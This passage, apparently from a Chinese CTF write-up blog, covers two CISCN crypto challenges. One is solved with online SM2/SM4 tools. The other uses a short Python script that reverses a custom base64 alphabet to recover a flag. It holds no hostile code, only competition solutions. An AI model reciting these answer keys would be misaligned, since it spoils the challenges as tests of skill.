+<h1 id="Crypto-1"><a href="#Crypto-1" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="27日-基于国密SM2算法的密钥密文分发"><a href="#27日-基于国密SM2算法的密钥密文分发" class="headerlink" title="27日_基于国密SM2算法的密钥密文分发"></a>27日_基于国密SM2算法的密钥密文分发</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://const.net.cn/tool/sm2/genkey/">https://const.net.cn/tool/sm2/genkey/</a><br><a target="_blank" rel="noopener" href="https://const.net.cn/tool/sm2/sm2-decrypt/">https://const.net.cn/tool/sm2/sm2-decrypt/</a><br><a target="_blank" rel="noopener" href="https://const.net.cn/tool/sm4/sm4-ecb-decrypt/">https://const.net.cn/tool/sm4/sm4-ecb-decrypt/</a> </p>
+</blockquote>
+<p>使用网站内容按照步骤操作即可。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685167591369-86affce6-458e-4054-ac34-059c28c9035e.png" alt="image.png"></p>
+<h2 id="27日-Sign-in-passwd"><a href="#27日-Sign-in-passwd" class="headerlink" title="27日_Sign_in_passwd"></a>27日_Sign_in_passwd</h2><p>按照排列映射加密</p>
+<pre class="language-none"><code class="language-none">import base64
+import urllib.parse
+after &#x3D; r&#39;GHI3KLMNJOPQRSTUb%3DcdefghijklmnopWXYZ%2F12%2B406789VaqrstuvwxyzABCDEF5&#39;
+asc &#x3D; urllib.parse.unquote(after)
+former &#x3D; r&#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&#x3D;&#39;
+change &#x3D; str.maketrans(asc, former)
+flag &#x3D; r&#39;j2rXjx8yjd&#x3D;YRZWyTIuwRdbyQdbqR3R9iZmsScutj2iqj3&#x2F;tidj1jd&#x3D;D&#39;
+flaga &#x3D; flag.translate(change)
+print(base64.b64decode(flaga).decode(&#39;utf-8&#39;))</code></pre>
+
+                        </article>
+                    </div>
+
+
+                    <div class="fleet-content-body-footer">
+                        <!--翻页器-->
+                        <div class="flex-row flex w-full justify-between">
+                            <div class="fleet-content-body-footer-left">
+                                
+                                    <div><a href="/posts/8b1fb998/"
+                                            class="btn btn-sm md:btn-md gap-2 lg:gap-3">
+                                            <svg class="h-6 w-6 fill-current md:h-8 md:w-8"
+                                                 xmlns="http://www.w3.org/2000/svg"
+                                                 width="24" height="24" viewBox="0 0 24 24">
+                                                <path d="M15.41,16.58L10.83,12L15.41,7.41L14,6L8,12L14,18L15.41,16.58Z"></path>
+                                            </svg>
+                                            <div class="flex flex-col items-start"><span
+                                                        class="text-base-content/50 hidden text-xs font-normal md:block">上一篇</span>
+                                                <span>web106-w</span></div>
+                                        </a></div>
+                                
+                            </div>
+                            <div class="fleet-content-body-footer-right">
+                                
+                                    <div><a href="/posts/37f43c4f/"
+                                            class="btn btn-neutral btn-sm md:btn-md gap-2 lg:gap-3">
+                                            <div class="flex flex-col items-end"><span
+                                                        class="text-neutral-content/50 hidden text-xs font-normal md:block">下一篇</span>
+                                                <span>web89-web105php特性篇（一）</span></div>
+                                            <svg class="h-6 w-6 fill-current md:h-8 md:w-8"
+                                                 xmlns="http://www.w3.org/2000/svg"
+                                                 width="24" height="24" viewBox="0 0 24 24">
+                                                <path d="M8.59,16.58L13.17,12L8.59,7.41L10,6L16,12L10,18L8.59,16.58Z"></path>
+                                            </svg>
+                                        </a></div>
+
+                                
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+</div>
+
+    <!--    嵌套位置结束-->
+
+
+
+
+
+    <!--<h3>categories</h3>-->
+    <!--<ul>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/categories/CTF/">-->
+    <!--                CTF-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/categories/Python/">-->
+    <!--                Python-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--</ul>-->
+
+    <!--<h3>tags</h3>-->
+    <!--<ul>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/WriteUp/">-->
+    <!--                WriteUp-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/CISCN/">-->
+    <!--                CISCN-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/valorant/">-->
+    <!--                valorant-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/genshin/">-->
+    <!--                genshin-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/Shortcut/">-->
+    <!--                Shortcut-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/%E8%AF%AD%E9%9B%80/">-->
+    <!--                语雀-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/%E8%84%9A%E6%9C%AC/">-->
+    <!--                脚本-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/CTFshow0-1/">-->
+    <!--                CTFshow0-1-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/Tampermonkey/">-->
+    <!--                Tampermonkey-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--</ul>-->
+</div>
+<!--返回顶部按钮-->
+<button class="backToTopBtn btn" title="返回顶部">&#8593;</button>
+<!--加个渐变，但还是有点丑-->
+<!-- TODO 换个更好的方案-->
+<div class="h-1 bg-gradient-to-t from-base-content to-base-100">
+</div>
+
+<footer class="footer p-10 bg-neutral text-neutral-content">
+    <aside>
+        <svg width="50" height="50" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill-rule="evenodd" clip-rule="evenodd" class="fill-current mt-3"><path d="M22.672 15.226l-2.432.811.841 2.515c.33 1.019-.209 2.127-1.23 2.456-1.15.325-2.148-.321-2.463-1.226l-.84-2.518-5.013 1.677.84 2.517c.391 1.203-.434 2.542-1.831 2.542-.88 0-1.601-.564-1.86-1.314l-.842-2.516-2.431.809c-1.135.328-2.145-.317-2.463-1.229-.329-1.018.211-2.127 1.231-2.456l2.432-.809-1.621-4.823-2.432.808c-1.355.384-2.558-.59-2.558-1.839 0-.817.509-1.582 1.327-1.846l2.433-.809-.842-2.515c-.33-1.02.211-2.129 1.232-2.458 1.02-.329 2.13.209 2.461 1.229l.842 2.515 5.011-1.677-.839-2.517c-.403-1.238.484-2.553 1.843-2.553.819 0 1.585.509 1.85 1.326l.841 2.517 2.431-.81c1.02-.33 2.131.211 2.461 1.229.332 1.018-.21 2.126-1.23 2.456l-2.433.809 1.622 4.823 2.433-.809c1.242-.401 2.557.484 2.557 1.838 0 .819-.51 1.583-1.328 1.847m-8.992-6.428l-5.01 1.675 1.619 4.828 5.011-1.674-1.62-4.829z"></path></svg>
+        © 2020-2024 Lupas by Natro92
+        <pre class="whitespace-pre-line">框架 <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/">Hexo</a> | 主题 <a target="_blank" rel="noopener" href="https://www.example.com">Lupas</a></pre>
+    </aside>
+    <nav>
+        <header class="footer-title">Social</header>
+        <!--<div class="grid grid-flow-col gap-4">-->
+        <!--    <a><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-current"><path d="M24 4.557c-.883.392-1.832.656-2.828.775 1.017-.609 1.798-1.574 2.165-2.724-.951.564-2.005.974-3.127 1.195-.897-.957-2.178-1.555-3.594-1.555-3.179 0-5.515 2.966-4.797 6.045-4.091-.205-7.719-2.165-10.148-5.144-1.29 2.213-.669 5.108 1.523 6.574-.806-.026-1.566-.247-2.229-.616-.054 2.281 1.581 4.415 3.949 4.89-.693.188-1.452.232-2.224.084.626 1.956 2.444 3.379 4.6 3.419-2.07 1.623-4.678 2.348-7.29 2.04 2.179 1.397 4.768 2.212 7.548 2.212 9.142 0 14.307-7.721 13.995-14.646.962-.695 1.797-1.562 2.457-2.549z"></path></svg></a>-->
+        <!--    <a><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-current"><path d="M19.615 3.184c-3.604-.246-11.631-.245-15.23 0-3.897.266-4.356 2.62-4.385 8.816.029 6.185.484 8.549 4.385 8.816 3.6.245 11.626.246 15.23 0 3.897-.266 4.356-2.62 4.385-8.816-.029-6.185-.484-8.549-4.385-8.816zm-10.615 12.816v-8l8 3.993-8 4.007z"></path></svg></a>-->
+        <!--    <a><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-current"><path d="M9 8h-3v4h3v12h5v-12h3.642l.358-4h-4v-1.667c0-.955.192-1.333 1.115-1.333h2.885v-5h-3.808c-3.596 0-5.192 1.583-5.192 4.615v3.385z"></path></svg></a>-->
+        <!--</div>-->
+    </nav>
+</footer>
+</body>
+
+</html>
+
+
